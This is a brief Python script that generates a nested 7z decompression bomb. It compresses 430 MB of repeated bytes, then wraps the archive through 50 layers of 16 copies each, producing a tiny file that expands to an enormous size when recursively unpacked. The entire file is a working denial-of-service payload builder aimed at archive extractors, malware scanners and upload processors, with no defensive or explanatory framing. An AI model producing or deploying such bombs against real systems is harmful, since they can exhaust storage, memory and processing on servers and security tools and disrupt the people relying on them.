import os
import shutil
import subprocess
from pathlib import Path

# SETTINGS
payload_txt = "payload.txt"
payload_7z = "payload.7z"
layer_depth = 50
width = 16
initial_size = 430 * 1024 * 1024  # 430 MB

# STEP 1: Create dummy payload
with open(payload_txt, "wb") as f:
    f.write(b"A" * initial_size)

# STEP 2: Compress to .7z with ultra compression
subprocess.run(["7z", "a", "-mx=9", payload_7z, payload_txt], check=True)
os.remove(payload_txt)

# STEP 3: Recursive nesting
input_file = Path(payload_7z)
for layer in range(1, layer_depth + 1):
    layer_dir = Path(f"decomp/layer_{layer}")
    layer_dir.mkdir(parents=True, exist_ok=True)

    for i in range(width):
        shutil.copy(input_file, layer_dir / f"copy_{i}.7z")

    output_archive = Path(f"layer_{layer}.7z")
    subprocess.run(["7z", "a", "-mx=9", str(output_archive), str(layer_dir)], check=True)

    input_file = output_archive
